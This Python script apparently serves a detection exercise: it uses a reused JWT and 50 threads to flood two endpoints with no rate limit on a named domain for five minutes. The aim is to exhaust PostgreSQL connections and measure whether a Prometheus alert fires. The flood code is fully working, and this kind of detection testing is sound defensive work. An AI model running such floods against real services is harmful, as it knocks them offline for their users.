"""
API Resource Abuse — Unrestricted Resource Consumption
OWASP API4:2023 - Unrestricted Resource Consumption

[실제 사고 모티브]
- OWASP API4:2023: rate limit 없는 API 엔드포인트를
  공격자가 반복 호출하여 서버 리소스를 고갈시키는 공격
- Business Logic Abuse: 단일 요청이 백엔드에서
  수십 개의 DB 쿼리로 증폭되는 엔드포인트를 의도적으로 남용

[실제와의 차이]
- 실제: 공격자가 크리덴셜 스터핑/피싱으로
        유효한 계정을 탈취한 뒤 API 남용
- 우리: Assumed Breach 모델
        (계정 탈취는 이미 됐다고 가정)
        탈취한 JWT 토큰으로 rate limit 없는
        고비용 엔드포인트 반복 호출

[블랙박스 공격자 관점]
- 공격자는 API 내부 구조를 모름 (블랙박스)
- /api/v1/my-plants 엔드포인트 발견
- 반복 호출 시 JPA Lazy Loading 발동
- DB 연결 수 급증 → 리소스 고갈

탐지 포인트: HighPostgresConnections (Prometheus)
AIOps 포인트: DB 연결 수 급증 → LLM 분석 → NOTIFY 권고
"""

import ssl
import json
import os
import sys
import time
from datetime import datetime, timezone
from concurrent.futures import ThreadPoolExecutor
import urllib.request
import urllib.error

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))
from common.verifier import ScenarioVerifier, VerifyResult

# ── 설정 ──────────────────────────────────────────────────────────────────────
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
LOG_PATH   = os.path.normpath(os.path.join(SCRIPT_DIR, "..", "logs", "anomaly_log.json"))

TARGET_BASE  = os.getenv("TARGET_URL", "https://leafy-pr.com")
JWT_TOKEN    = os.getenv("LEAFY_TEST_TOKEN", "")
WORKERS      = 50
DURATION_SEC = 300

# rate limit 없는 고비용 엔드포인트
# JPA Lazy Loading 발동 → DB 연결 수 급증
API_ENDPOINTS = [
    "/api/v1/my-plants",
    "/api/v1/schedules",
]

_ssl_ctx = ssl.create_default_context()
_ssl_ctx.check_hostname = False
_ssl_ctx.verify_mode    = ssl.CERT_NONE


# ── 로그 유틸 ─────────────────────────────────────────────────────────────────
def _load_log() -> list:
    if os.path.exists(LOG_PATH) and os.path.getsize(LOG_PATH) > 0:
        with open(LOG_PATH, "r", encoding="utf-8") as f:
            return json.load(f)
    return []

def _save_log(records: list) -> None:
    os.makedirs(os.path.dirname(LOG_PATH), exist_ok=True)
    with open(LOG_PATH, "w", encoding="utf-8") as f:
        json.dump(records, f, indent=2, ensure_ascii=False)

def record_event(scenario, start, end, status, detail=""):
    records = _load_log()
    records.append({
        "scenario": scenario, "category": "security",
        "start_time": start, "end_time": end,
        "status": status, "detail": detail,
    })
    _save_log(records)
    print(f"[LOG] {scenario} | {status} | {start} → {end}")


# ── 단건 API 요청 ─────────────────────────────────────────────────────────────
def _send_request() -> tuple[int, float]:
    import random
    endpoint = random.choice(API_ENDPOINTS)
    url = TARGET_BASE + endpoint
    t0  = time.time()
    try:
        req = urllib.request.Request(
            url,
            headers={
                "Authorization": f"Bearer {JWT_TOKEN}",
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0 (compatible; APIAbuser/1.0)",
            },
        )
        r = urllib.request.urlopen(req, context=_ssl_ctx, timeout=10)
        return r.status, (time.time() - t0) * 1000
    except urllib.error.HTTPError as e:
        return e.code, (time.time() - t0) * 1000
    except Exception:
        return 0, (time.time() - t0) * 1000


# ── 메인 ──────────────────────────────────────────────────────────────────────
def main():
    scenario = "api_resource_abuse"

    # 토큰 확인
    if not JWT_TOKEN:
        print("[!] LEAFY_TEST_TOKEN 환경변수가 없습니다.")
        print("[!] .env 파일에 LEAFY_TEST_TOKEN=<JWT토큰> 추가 후 재실행하세요.")
        sys.exit(1)

    # ── 1단계: Verifier 초기화 ────────────────────────────────────────────────
    verifier = ScenarioVerifier(
        scenario_name="api_resource_abuse",
        alert_name="HighPostgresConnections",
        hypothesis=(
            "탈취된 JWT 토큰으로 rate limit 없는 API 엔드포인트 반복 호출 시 "
            "DB 연결 수 급증 → HighPostgresConnections Alert 발화"
        ),
        steady_state_query='sum(pg_stat_activity_count{datname="leafy"})',
        steady_state_threshold=40.0,
        metric_label="PostgreSQL 연결 수",
        metric_unit="개",
        metric_scale=1.0,
    )

    verifier.check_steady_state()
    verifier.print_hypothesis()
    verifier.wait_for_alert_inactive(timeout=60, poll_interval=5)
    verifier.start_timer()

    # ── 2단계: 공격 시작 ──────────────────────────────────────────────────────
    print(f"\n[*] 시나리오: API Resource Abuse")
    print(f"[*] 기반: OWASP API4:2023 Unrestricted Resource Consumption")
    print(f"[*] 모델: Assumed Breach (계정 탈취 완료 가정)")
    print(f"[*] 대상: {TARGET_BASE}")
    print(f"[*] 엔드포인트: {API_ENDPOINTS}")
    print(f"[*] 동시 스레드: {WORKERS} / 지속: {DURATION_SEC}초")
    print(f"[*] 탐지 목표: HighPostgresConnections (pg_stat_activity > 40)")

    start_time = datetime.now(timezone.utc).isoformat()
    deadline   = time.time() + DURATION_SEC

    total = 0
    success = 0
    status_counts: dict[int, int] = {}

    with ThreadPoolExecutor(max_workers=WORKERS) as pool:
        futures = []
        while time.time() < deadline:
            while len(futures) < WORKERS * 2 and time.time() < deadline:
                futures.append(pool.submit(_send_request))

            done, futures = futures[:WORKERS], futures[WORKERS:]
            for f in done:
                try:
                    code, ms = f.result(timeout=11)
                    total += 1
                    status_counts[code] = status_counts.get(code, 0) + 1
                    if code == 200:
                        success += 1
                    if total % 100 == 0:
                        print(f"  → {total}건 전송 | 200: {success} | 상태별: {dict(sorted(status_counts.items()))}")
                except Exception:
                    total += 1

    end_time = datetime.now(timezone.utc).isoformat()
    detail = json.dumps({
        "total_requests": total,
        "success_200":    success,
        "status_counts":  status_counts,
        "workers":        WORKERS,
        "duration_sec":   DURATION_SEC,
        "endpoints":      API_ENDPOINTS,
        "attack_model":   "Assumed Breach - JWT token reuse",
        "owasp":          "API4:2023 Unrestricted Resource Consumption",
    }, ensure_ascii=False)

    record_event(
        scenario, start_time, end_time,
        "success" if success > 0 else "error",
        detail,
    )
    print(f"\n[*] 완료: 총 {total}건 | 성공 {success}건")

    # ── 3단계: Prometheus Alert 발화 기반 MTTD 측정 ───────────────────────────
    print("\n[*] HighPostgresConnections Alert 발화 대기 중...")
    result = verifier.verify(timeout=120, poll_interval=5)

    # ── 4단계: 결과 기록 ──────────────────────────────────────────────────────
    verifier.log_result(result)


if __name__ == "__main__":
    main()